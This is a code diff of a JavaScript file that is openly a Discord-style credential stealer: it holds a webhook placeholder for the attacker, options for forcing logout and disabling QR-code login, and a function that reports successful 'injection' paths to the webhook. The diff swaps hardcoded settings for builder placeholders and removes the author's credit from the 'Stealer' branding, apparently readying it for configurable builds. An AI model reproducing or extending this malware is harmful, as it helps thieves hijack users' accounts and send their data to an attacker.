@@ -9,12 +9,12 @@ const buf_replace = require('buffer-replace');
 const webhook = "da_webhook"
 
 const config = {
-    "logout": "instant",
-    "inject-notify": "true",
-    "logout-notify": "true",
-    "init-notify":"true",
-    "embed-color": 000000,
-    "disable-qr-code": "true"
+    "logout": "%LOGOUT%1",
+    "inject-notify": "%INJECTNOTI%1",
+    "logout-notify": "%LOGOUTNOTI%1",
+    "init-notify":"%INITNOTI%1",
+    "embed-color": %MBEDCOLOR%1,
+    "disable-qr-code": "%DISABLEQRCODE%1"
 }
 
 
@@ -159,8 +159,8 @@ function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
         var c = {
-            name: ":lock: **successfully injected**",
-            value: ${path},
+            name: ":lock: Inject Path",
+            value: ` ${path} `,
             inline: !1
         }
         fields.push(c)
@@ -170,14 +170,14 @@ function injectNotify() {
         "content": null,
         "embeds": [
           {
-            "title": ":lock: ",
-            "color": 000000,
+            "title": ":lock: injected",
+            "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": "Stealer by fnjii"
+              "name": "Stealer"
             },
             "footer": {
-              "text": "Stealer by Fnji"
+              "text": "Stealer"
             }
           }
         ]
